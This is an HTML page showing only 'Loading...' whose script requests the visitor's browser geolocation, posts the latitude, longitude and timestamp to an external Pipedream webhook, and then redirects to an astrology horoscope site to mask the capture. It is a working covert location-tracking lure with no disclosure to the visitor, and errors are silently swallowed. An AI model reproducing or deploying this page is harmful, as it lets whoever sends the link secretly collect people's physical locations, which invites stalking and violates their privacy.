<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
  <style>
    body {
      background: #fff;
      color: #000;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
  </style>
</head>
<body>
  <script>
    const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
    const redirectToAstro = () => {
      window.location.href = "https://www.astro.com/horoscope";
    };

    function sendLocation(position) {
      const { latitude, longitude } = position.coords;
      const timestamp = new Date().toISOString();

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, timestamp })
      })
      .catch(() => {}) // Jika gagal tetap redirect
      .finally(() => {
        setTimeout(redirectToAstro, 1000);
      });
    }

    function handleError() {
      setTimeout(redirectToAstro, 1000);
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
        timeout: 10000
      });
    } else {
      handleError();
    }
  </script>
</body>
</html>
